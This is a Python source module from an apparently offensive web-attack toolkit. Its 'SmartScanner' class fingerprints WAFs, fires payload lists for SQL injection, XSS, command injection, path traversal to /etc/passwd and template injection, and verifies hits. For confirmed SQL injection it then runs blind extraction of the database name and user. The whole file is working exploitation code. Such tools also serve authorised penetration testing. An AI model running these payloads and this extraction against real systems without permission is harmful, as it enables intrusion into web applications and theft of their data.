"""Smart Scanner - Automatic vulnerability detection and exploitation."""

import asyncio
from dataclasses import dataclass, field
from typing import Optional, Callable, Any
from enum import Enum

from ..core.context import AttackContext
from ..core.http_client import HttpClient, Response
from ..core.response_learner import ResponseLearner
from ..core.context_analyzer import ContextAnalyzer, ReflectionType
from ..recon.waf_detector import WafDetector, WafResult, WafType
from ..utils.logger import log_info, log_success, log_warning, log_error, create_progress


class ScanPhase(Enum):
    """Phases of smart scanning."""
    RECON = "recon"
    DETECTION = "detection"
    VERIFICATION = "verification"
    EXTRACTION = "extraction"


class VulnerabilityType(Enum):
    """Types of vulnerabilities."""
    SQLI_ERROR = "sqli_error"
    SQLI_BOOLEAN = "sqli_boolean"
    SQLI_TIME = "sqli_time"
    SQLI_UNION = "sqli_union"
    XSS_REFLECTED = "xss_reflected"
    XSS_STORED = "xss_stored"
    CMDI = "command_injection"
    LFI = "lfi"
    SSTI = "ssti"
    SSRF = "ssrf"


@dataclass
class ReconResult:
    """Results from reconnaissance phase."""
    waf_detected: bool
    waf_type: Optional[WafType] = None
    waf_name: str = ""
    bypass_suggestions: list[str] = field(default_factory=list)
    reflection_contexts: list[ReflectionType] = field(default_factory=list)
    technologies: list[str] = field(default_factory=list)
    baseline_learned: bool = False


@dataclass
class VulnerabilityFinding:
    """A detected vulnerability."""
    vuln_type: VulnerabilityType
    parameter: str
    payload: str
    evidence: str
    confidence: float  # 0.0 - 1.0
    verified: bool = False
    extracted_data: Optional[str] = None
    details: dict = field(default_factory=dict)


@dataclass
class SmartScanResult:
    """Complete smart scan result."""
    target_url: str
    parameter: str
    recon: ReconResult
    vulnerabilities: list[VulnerabilityFinding]
    requests_made: int
    phase_completed: ScanPhase


class SmartScanner:
    """
    Automatic vulnerability detection and exploitation.

    Features:
    - 4-phase scanning: Recon -> Detection -> Verification -> Extraction
    - WAF-aware payload selection
    - Context-aware XSS payloads
    - Automatic technique selection for SQLi
    - Intelligent false positive reduction
    """

    # Minimal detection payloads (low noise, high signal)
    DETECTION_PAYLOADS = {
        "sqli": {
            "error": ["'", '"', "\\", "1'", "1\""],
            "boolean": ["' AND '1'='1", "' AND '1'='2"],
            "time": ["' AND SLEEP(3)--", "'; WAITFOR DELAY '0:0:3'--"],
            "union": ["' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--"],
        },
        "xss": {
            "basic": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
            "attribute": ["\" onmouseover=\"alert(1)", "' onmouseover='alert(1)"],
            "js": ["</script><script>alert(1)</script>", "'-alert(1)-'"],
        },
        "cmdi": {
            "basic": ["; ls", "| ls", "$(ls)", "`ls`"],
            "time": ["; sleep 3", "| sleep 3", "& ping -c 3 127.0.0.1 &"],
        },
        "lfi": {
            "basic": ["../../../etc/passwd", "....//....//....//etc/passwd"],
            "wrapper": ["php://filter/convert.base64-encode/resource=index.php"],
        },
        "ssti": {
            "basic": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"],
        },
    }

    # SQL error patterns by database
    SQL_ERROR_PATTERNS = {
        "mysql": [r"mysql", r"sql syntax", r"at line \d+", r"mysqli?"],
        "mssql": [r"sql server", r"mssql", r"sqlsrv", r"odbc"],
        "postgresql": [r"postgresql", r"pg_", r"pgsql"],
        "oracle": [r"ora-\d+", r"oracle"],
        "sqlite": [r"sqlite", r"sqlite3"],
        "generic": [r"sql", r"syntax error", r"query", r"database error"],
    }

    def __init__(
        self,
        ctx: AttackContext,
        aggressive: bool = False,
        skip_waf_detection: bool = False,
    ):
        """
        Initialize smart scanner.

        Args:
            ctx: Attack context
            aggressive: Use more payloads (noisier but more thorough)
            skip_waf_detection: Skip WAF detection phase
        """
        self.ctx = ctx
        self.aggressive = aggressive
        self.skip_waf_detection = skip_waf_detection

        self.client = HttpClient(ctx)
        self.response_learner = ResponseLearner()
        self.context_analyzer = ContextAnalyzer()

        self.requests_made = 0
        self.findings: list[VulnerabilityFinding] = []
        self.recon_result: Optional[ReconResult] = None

    async def smart_scan(
        self,
        scan_types: Optional[list[str]] = None,
        on_finding: Optional[Callable[[VulnerabilityFinding], None]] = None,
        on_phase: Optional[Callable[[ScanPhase], None]] = None,
    ) -> SmartScanResult:
        """
        Perform intelligent vulnerability scan.

        Args:
            scan_types: Types to scan for (sqli, xss, cmdi, lfi, ssti). None = all
            on_finding: Callback when vulnerability found
            on_phase: Callback when phase changes

        Returns:
            SmartScanResult with all findings
        """
        if scan_types is None:
            scan_types = ["sqli", "xss", "cmdi", "lfi", "ssti"]

        current_phase = ScanPhase.RECON

        try:
            # Phase 1: Reconnaissance
            if on_phase:
                on_phase(ScanPhase.RECON)
            log_info("Phase 1: Reconnaissance")

            self.recon_result = await self._phase_recon()

            if self.recon_result.waf_detected:
                log_warning(f"WAF detected: {self.recon_result.waf_name}")
                if self.recon_result.bypass_suggestions:
                    log_info("Bypass suggestions available")

            # Phase 2: Detection
            current_phase = ScanPhase.DETECTION
            if on_phase:
                on_phase(ScanPhase.DETECTION)
            log_info("Phase 2: Detection")

            await self._phase_detection(scan_types, on_finding)

            if not self.findings:
                log_info("No vulnerabilities detected")
                await self.client.close()
                return SmartScanResult(
                    target_url=self.ctx.target_url,
                    parameter=self.ctx.inject_param or "",
                    recon=self.recon_result,
                    vulnerabilities=[],
                    requests_made=self.requests_made,
                    phase_completed=current_phase,
                )

            # Phase 3: Verification
            current_phase = ScanPhase.VERIFICATION
            if on_phase:
                on_phase(ScanPhase.VERIFICATION)
            log_info("Phase 3: Verification")

            await self._phase_verification()

            # Phase 4: Extraction (for confirmed SQLi)
            current_phase = ScanPhase.EXTRACTION
            sqli_findings = [f for f in self.findings if f.verified and "sqli" in f.vuln_type.value]

            if sqli_findings:
                if on_phase:
                    on_phase(ScanPhase.EXTRACTION)
                log_info("Phase 4: Data Extraction")

                await self._phase_extraction(sqli_findings)

        finally:
            await self.client.close()

        return SmartScanResult(
            target_url=self.ctx.target_url,
            parameter=self.ctx.inject_param or "",
            recon=self.recon_result,
            vulnerabilities=self.findings,
            requests_made=self.requests_made,
            phase_completed=current_phase,
        )

    async def _phase_recon(self) -> ReconResult:
        """Phase 1: Reconnaissance - WAF detection, baseline learning, context analysis."""
        result = ReconResult(waf_detected=False)

        # Get baseline responses for learning
        log_info("Learning baseline responses...")
        baseline_responses = []
        for _ in range(3):
            resp = await self._request()
            baseline_responses.append(resp)
            await asyncio.sleep(0.5)

        self.response_learner.learn_baseline(baseline_responses)
        result.baseline_learned = True

        # WAF Detection
        if not self.skip_waf_detection:
            log_info("Detecting WAF...")
            waf_detector = WafDetector(self.ctx)
            waf_result = await waf_detector.detect(probe=True, num_probes=3)

            result.waf_detected = waf_result.detected
            result.waf_type = waf_result.waf_type
            result.waf_name = waf_result.waf_name
            result.bypass_suggestions = waf_result.bypass_suggestions

        # Context Analysis - send a probe to see where it's reflected
        log_info("Analyzing reflection context...")
        probe = ContextAnalyzer.PROBE_MARKER
        probe_resp = await self._request_with_payload(probe)

        if probe in probe_resp.text:
            analysis = self.context_analyzer.analyze_reflection(probe_resp.text, probe)
            result.reflection_contexts = list(analysis.unique_contexts)
            log_info(f"Reflection contexts found: {[c.value for c in result.reflection_contexts]}")

        return result

    async def _phase_detection(
        self,
        scan_types: list[str],
        on_finding: Optional[Callable[[VulnerabilityFinding], None]] = None
    ) -> None:
        """Phase 2: Detection - Test minimal payloads to identify vulnerabilities."""

        for scan_type in scan_types:
            if scan_type == "sqli":
                await self._detect_sqli(on_finding)
            elif scan_type == "xss":
                await self._detect_xss(on_finding)
            elif scan_type == "cmdi":
                await self._detect_cmdi(on_finding)
            elif scan_type == "lfi":
                await self._detect_lfi(on_finding)
            elif scan_type == "ssti":
                await self._detect_ssti(on_finding)

    async def _detect_sqli(
        self,
        on_finding: Optional[Callable[[VulnerabilityFinding], None]] = None
    ) -> None:
        """Detect SQL Injection vulnerabilities."""
        log_info("Testing for SQL Injection...")

        # Test error-based first (fastest)
        for payload in self.DETECTION_PAYLOADS["sqli"]["error"]:
            resp = await self._request_with_payload(payload)

            # Check for SQL errors
            for db, patterns in self.SQL_ERROR_PATTERNS.items():
                import re
                for pattern in patterns:
                    if re.search(pattern, resp.text, re.IGNORECASE):
                        finding = VulnerabilityFinding(
                            vuln_type=VulnerabilityType.SQLI_ERROR,
                            parameter=self.ctx.inject_param or "",
                            payload=payload,
                            evidence=f"SQL error pattern matched: {pattern}",
                            confidence=0.9,
                            details={"db_type": db},
                        )
                        self.findings.append(finding)
                        if on_finding:
                            on_finding(finding)
                        log_success(f"Error-based SQLi detected ({db})")
                        return  # Found, no need to test more

        # Test boolean-based
        true_payloads = self.DETECTION_PAYLOADS["sqli"]["boolean"][:1]
        false_payloads = self.DETECTION_PAYLOADS["sqli"]["boolean"][1:2]

        for true_p, false_p in zip(true_payloads, false_payloads):
            true_resp = await self._request_with_payload(true_p)
            false_resp = await self._request_with_payload(false_p)

            if self.response_learner.detect_boolean_difference(true_resp, false_resp):
                finding = VulnerabilityFinding(
                    vuln_type=VulnerabilityType.SQLI_BOOLEAN,
                    parameter=self.ctx.inject_param or "",
                    payload=true_p,
                    evidence=f"Boolean difference detected (length diff: {abs(true_resp.content_length - false_resp.content_length)})",
                    confidence=0.7,
                )
                self.findings.append(finding)
                if on_finding:
                    on_finding(finding)
                log_success("Boolean-based SQLi detected")
                return

        # Test time-based (slowest, only if aggressive)
        if self.aggressive:
            for payload in self.DETECTION_PAYLOADS["sqli"]["time"]:
                resp = await self._request_with_payload(payload)

                if resp.elapsed > 2.5:
                    finding = VulnerabilityFinding(
                        vuln_type=VulnerabilityType.SQLI_TIME,
                        parameter=self.ctx.inject_param or "",
                        payload=payload,
                        evidence=f"Time delay detected: {resp.elapsed:.2f}s",
                        confidence=0.8,
                    )
                    self.findings.append(finding)
                    if on_finding:
                        on_finding(finding)
                    log_success("Time-based SQLi detected")
                    return

    async def _detect_xss(
        self,
        on_finding: Optional[Callable[[VulnerabilityFinding], None]] = None
    ) -> None:
        """Detect XSS vulnerabilities."""
        log_info("Testing for XSS...")

        # Choose payloads based on reflection context
        payloads = []

        if self.recon_result and self.recon_result.reflection_contexts:
            contexts = self.recon_result.reflection_contexts

            if ReflectionType.HTML_TEXT in contexts:
                payloads.extend(self.DETECTION_PAYLOADS["xss"]["basic"])
            if ReflectionType.HTML_ATTRIBUTE in contexts:
                payloads.extend(self.DETECTION_PAYLOADS["xss"]["attribute"])
            if ReflectionType.JAVASCRIPT in contexts:
                payloads.extend(self.DETECTION_PAYLOADS["xss"]["js"])
        else:
            # Test all
            for cat_payloads in self.DETECTION_PAYLOADS["xss"].values():
                payloads.extend(cat_payloads)

        for payload in payloads[:5]:  # Limit to 5 payloads
            resp = await self._request_with_payload(payload)

            # Check if payload is reflected unencoded
            if payload in resp.text:
                finding = VulnerabilityFinding(
                    vuln_type=VulnerabilityType.XSS_REFLECTED,
                    parameter=self.ctx.inject_param or "",
                    payload=payload,
                    evidence="Payload reflected without encoding",
                    confidence=0.9,
                )
                self.findings.append(finding)
                if on_finding:
                    on_finding(finding)
                log_success("Reflected XSS detected")
                return

    async def _detect_cmdi(
        self,
        on_finding: Optional[Callable[[VulnerabilityFinding], None]] = None
    ) -> None:
        """Detect Command Injection vulnerabilities."""
        log_info("Testing for Command Injection...")

        # Test time-based (most reliable)
        for payload in self.DETECTION_PAYLOADS["cmdi"]["time"]:
            resp = await self._request_with_payload(payload)

            if resp.elapsed > 2.5:
                finding = VulnerabilityFinding(
                    vuln_type=VulnerabilityType.CMDI,
                    parameter=self.ctx.inject_param or "",
                    payload=payload,
                    evidence=f"Time delay detected: {resp.elapsed:.2f}s",
                    confidence=0.8,
                )
                self.findings.append(finding)
                if on_finding:
                    on_finding(finding)
                log_success("Command Injection detected")
                return

    async def _detect_lfi(
        self,
        on_finding: Optional[Callable[[VulnerabilityFinding], None]] = None
    ) -> None:
        """Detect Local File Inclusion vulnerabilities."""
        log_info("Testing for LFI...")

        # Common file content patterns
        file_patterns = [
            (r"root:.*:0:0:", "/etc/passwd"),
            (r"\[boot loader\]", "boot.ini"),
            (r"PD9waHA", "PHP base64"),  # <?php base64 encoded
        ]

        for payload in self.DETECTION_PAYLOADS["lfi"]["basic"]:
            resp = await self._request_with_payload(payload)

            import re
            for pattern, file_name in file_patterns:
                if re.search(pattern, resp.text):
                    finding = VulnerabilityFinding(
                        vuln_type=VulnerabilityType.LFI,
                        parameter=self.ctx.inject_param or "",
                        payload=payload,
                        evidence=f"File content pattern matched: {file_name}",
                        confidence=0.95,
                    )
                    self.findings.append(finding)
                    if on_finding:
                        on_finding(finding)
                    log_success("LFI detected")
                    return

    async def _detect_ssti(
        self,
        on_finding: Optional[Callable[[VulnerabilityFinding], None]] = None
    ) -> None:
        """Detect Server-Side Template Injection vulnerabilities."""
        log_info("Testing for SSTI...")

        # Each payload and expected result
        ssti_tests = [
            ("{{7*7}}", "49", "jinja2/twig"),
            ("${7*7}", "49", "freemarker/velocity"),
            ("<%= 7*7 %>", "49", "erb"),
            ("#{7*7}", "49", "ruby/java"),
            ("{{7*'7'}}", "7777777", "jinja2"),
        ]

        for payload, expected, engine in ssti_tests:
            resp = await self._request_with_payload(payload)

            if expected in resp.text:
                finding = VulnerabilityFinding(
                    vuln_type=VulnerabilityType.SSTI,
                    parameter=self.ctx.inject_param or "",
                    payload=payload,
                    evidence=f"Template expression evaluated (likely {engine})",
                    confidence=0.9,
                    details={"template_engine": engine},
                )
                self.findings.append(finding)
                if on_finding:
                    on_finding(finding)
                log_success(f"SSTI detected (likely {engine})")
                return

    async def _phase_verification(self) -> None:
        """Phase 3: Verification - Confirm detected vulnerabilities."""
        log_info(f"Verifying {len(self.findings)} potential vulnerabilities...")

        for finding in self.findings:
            if finding.vuln_type == VulnerabilityType.SQLI_ERROR:
                # Verify error-based by sending a valid payload
                resp = await self._request_with_payload("1")
                is_anomaly, _, _ = self.response_learner.is_anomaly(resp)
                finding.verified = not is_anomaly  # Normal response = error was from payload
                if finding.verified:
                    finding.confidence = 0.95

            elif finding.vuln_type == VulnerabilityType.SQLI_BOOLEAN:
                # Re-test boolean difference
                true_resp = await self._request_with_payload("' AND '1'='1")
                false_resp = await self._request_with_payload("' AND '1'='2")
                finding.verified = self.response_learner.detect_boolean_difference(true_resp, false_resp)
                if finding.verified:
                    finding.confidence = 0.85

            elif finding.vuln_type == VulnerabilityType.SQLI_TIME:
                # Re-test time delay
                resp = await self._request_with_payload(finding.payload)
                finding.verified = resp.elapsed > 2.5
                if finding.verified:
                    finding.confidence = 0.9

            elif finding.vuln_type == VulnerabilityType.XSS_REFLECTED:
                # Already verified by reflection
                finding.verified = True
                finding.confidence = 0.9

            elif finding.vuln_type == VulnerabilityType.LFI:
                # Already verified by file content
                finding.verified = True
                finding.confidence = 0.95

            elif finding.vuln_type == VulnerabilityType.SSTI:
                # Already verified by expression evaluation
                finding.verified = True
                finding.confidence = 0.9

            elif finding.vuln_type == VulnerabilityType.CMDI:
                # Re-test time delay
                resp = await self._request_with_payload(finding.payload)
                finding.verified = resp.elapsed > 2.5
                if finding.verified:
                    finding.confidence = 0.85

            status = "VERIFIED" if finding.verified else "UNVERIFIED"
            log_info(f"{finding.vuln_type.value}: {status} (confidence: {finding.confidence:.0%})")

    async def _phase_extraction(self, sqli_findings: list[VulnerabilityFinding]) -> None:
        """Phase 4: Extraction - Extract data from confirmed SQLi vulnerabilities."""
        from .sqli.blind_extractor import ParallelBlindExtractor, BlindTechnique, DatabaseType

        for finding in sqli_findings:
            if finding.vuln_type == VulnerabilityType.SQLI_TIME:
                log_info("Extracting data using time-based technique...")

                extractor = ParallelBlindExtractor(
                    self.ctx,
                    technique=BlindTechnique.TIME,
                    db_type=DatabaseType.MYSQL,  # Default, could be detected
                    parallelism=3,
                )

                try:
                    await extractor.setup()

                    # Extract basic info
                    db_result = await extractor.extract_string("DATABASE()", max_length=50)
                    user_result = await extractor.extract_string("USER()", max_length=50)

                    finding.extracted_data = f"Database: {db_result.value}, User: {user_result.value}"
                    log_success(f"Extracted: {finding.extracted_data}")

                except Exception as e:
                    log_warning(f"Extraction failed: {e}")
                finally:
                    await extractor.close()

            elif finding.vuln_type == VulnerabilityType.SQLI_BOOLEAN:
                log_info("Extracting data using boolean-based technique...")

                extractor = ParallelBlindExtractor(
                    self.ctx,
                    technique=BlindTechnique.BOOLEAN,
                    db_type=DatabaseType.MYSQL,
                    parallelism=3,
                )

                try:
                    await extractor.setup()

                    db_result = await extractor.extract_string("DATABASE()", max_length=50)
                    finding.extracted_data = f"Database: {db_result.value}"
                    log_success(f"Extracted: {finding.extracted_data}")

                except Exception as e:
                    log_warning(f"Extraction failed: {e}")
                finally:
                    await extractor.close()

    async def _request(self) -> Response:
        """Make a request and track count."""
        self.requests_made += 1
        return await self.client.request()

    async def _request_with_payload(self, payload: str) -> Response:
        """Make a request with payload and track count."""
        self.requests_made += 1
        return await self.client.request_with_payload(payload)

    async def close(self) -> None:
        """Close HTTP client."""
        await self.client.close()
